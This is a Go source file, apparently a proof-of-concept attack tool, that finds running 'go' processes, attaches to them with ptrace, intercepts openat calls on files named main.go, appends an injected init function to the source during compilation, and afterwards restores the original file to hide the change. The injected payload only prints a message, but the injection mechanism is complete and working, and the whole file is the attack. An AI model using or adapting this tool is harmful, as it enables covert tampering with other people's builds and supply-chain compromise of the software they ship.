package main

import "C"

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"syscall"

	ps "github.com/mitchellh/go-ps"
	sec "github.com/seccomp/libseccomp-golang"
)

const hackerstring string = `
func init() {
	fmt.Println("Your code is hacked")
}
	`

type target struct {
	pid         int
	cleanSource []byte
	path        string
	proc        os.Process
	isPatched   bool
}

type syscallTask struct {
	ID   uint64
	Name string
}

func (t *target) detach() error {
	err := syscall.PtraceDetach(t.pid)
	if err != nil {
		log.Printf("Error detaching, %v", err)
		return err
	}
	return nil
}

func (t *target) patch() error {
	log.Printf("Patching %s", t.path)

	data, err := ioutil.ReadFile(t.path)
	if err != nil {
		log.Printf("Error Reading file %v", err)
		return err
	}

	// add init function
	f, err := os.OpenFile(t.path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error Opening File, %v", err)
		return err
	}

	if _, err := f.WriteString(hackerstring); err != nil {
		log.Printf("Error writing to file, %v", err)
	}

	t.cleanSource = data
	return nil
}

func (t *target) clean() error {
	if !t.isPatched {
		return nil
	}
	log.Printf("Cleaning %s", t.path)
	f, err := os.OpenFile(t.path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		log.Printf("Error opening file %v", err)
		return err
	}

	_, err = f.Write(t.cleanSource)
	if err != nil {
		log.Printf("Error writing file %v", err)
		return err
	}

	err = f.Close()
	if err != nil {
		log.Printf("Error closing file %v", err)
		return err
	}
	return nil
}

func (t *target) trace() error {
	t.isPatched = false
	runtime.LockOSThread()
	var regs syscall.PtraceRegs
	//wait Waiting state
	var wsstatus syscall.WaitStatus
	var err error

	pid := t.proc.Pid

	err = syscall.PtraceAttach(pid)
	if err != nil {
		fmt.Println(err)
		return err
	}

	syscall.Wait4(pid, &wsstatus, 0, nil)
	// If you exit abnormally , Then disconnect
	defer func() {
		// Yes PTRACE_DETACH Encapsulation , Disconnect from the tracker
		err = syscall.PtraceDetach(pid)
		if err != nil {
			fmt.Println("PtraceDetach err :", err)
			return
		}
		syscall.Wait4(pid, &wsstatus, 0, nil)
	}()

	for {
		syscall.PtraceSyscall(pid, 0)
		// Use wait system call , And pass in the waiting status pointer
		_, err := syscall.Wait4(pid, &wsstatus, 0, nil)
		if err != nil {
			fmt.Println("line 501", err)
			return err
		}

		if wsstatus.Exited() {
			fmt.Println("------exit status", wsstatus.ExitStatus())
			return nil
		}

		if wsstatus.StopSignal().String() == "interrupt" {
			syscall.PtraceSyscall(pid, int(wsstatus.StopSignal()))
			fmt.Println("send interrupt sig to pid ")
			// Print tracee Exit code
			fmt.Println("------exit status", wsstatus.ExitStatus())
			return nil
		}

		err = syscall.PtraceGetRegs(pid, &regs)
		if err != nil {
			fmt.Println("PtraceGetRegs err :", err.Error())
			return nil
		}

		name, _ := sec.ScmpSyscall(regs.Orig_rax).GetName()
		if name == "openat" {
			path, err := readString(pid, uintptr(regs.Rsi))
			if err != nil {
				fmt.Println("openat path error %v", err)
			}

			if strings.Contains(path, "main.go") {
				t.path = path
				fmt.Printf("Path: %s\n", t.path)
				fmt.Printf("Name: %s\n", name)
				if !t.isPatched {
					err = t.patch()
				}
				if err != nil {
					log.Printf("Error patching file, %v", err)
					return err
				}
				t.isPatched = true

			}
		}

		syscall.PtraceSyscall(pid, 0)
		_, err = syscall.Wait4(pid, &wsstatus, 0, nil)
		if err != nil {
			fmt.Println("line 518", err)
			return err
		}
		// If tracee sign out , Print the exit code of the process
		if wsstatus.Exited() {
			fmt.Println("------exit status", wsstatus.ExitStatus())
			return nil
		}
		// ditto , Determine whether the process is interrupted by a signal
		if wsstatus.StopSignal().String() == "interrupt" {
			syscall.PtraceSyscall(pid, int(wsstatus.StopSignal()))
			fmt.Println("send interrupt sig to pid ")
			fmt.Println("------exit status", wsstatus.ExitStatus())
		}
		// Get the status of the returned register
		err = syscall.PtraceGetRegs(pid, &regs)
		if err != nil {
			fmt.Println("PtraceGetRegs err :", err.Error())
			return err
		}
		// Print the return value parameter stored in the register
		//fmt.Println("syscall return:", regs.Rax)
	}

}

func main() {

	pids := []int{}

	log.Printf("Starting")
	targets := make(chan target, 1)
	c := make(chan os.Signal)

	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		os.Exit(1)
	}()

	go func() {
		for {
			activeTarget := <-targets
			err := activeTarget.trace()
			if err != nil {
				log.Printf(err.Error())

			} else {
				activeTarget.clean()
			}

		}

	}()

	//find new targets

	for {
		procs, err := ps.Processes()
		if err != nil {
			log.Printf("Error finding procs: %v", err)
		}

		for _, proc := range procs {
			if !contains(pids, proc.Pid()) {
				if proc.Executable() == "go" {

					process, err := os.FindProcess(proc.Pid())
					if err != nil {
						log.Printf("%v", err)

					}

					newTarget := target{
						pid:  proc.Pid(),
						proc: *process,
					}

					pids = append(pids, proc.Pid())
					log.Printf("New Active Target PID: %d", proc.Pid())
					targets <- newTarget

				}
			}
		}
	}

}

func readString(pid int, addr uintptr) (string, error) {
	data := make([]byte, 4096)
	bytes_copied, _ := syscall.PtracePeekData(pid, addr, data)
	if bytes_copied == 0 {
		return "", fmt.Errorf("0-byte string returned")
	}
	str := C.GoString((*C.char)(C.CBytes(data)))
	return str, nil
}

func contains(s []int, e int) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}
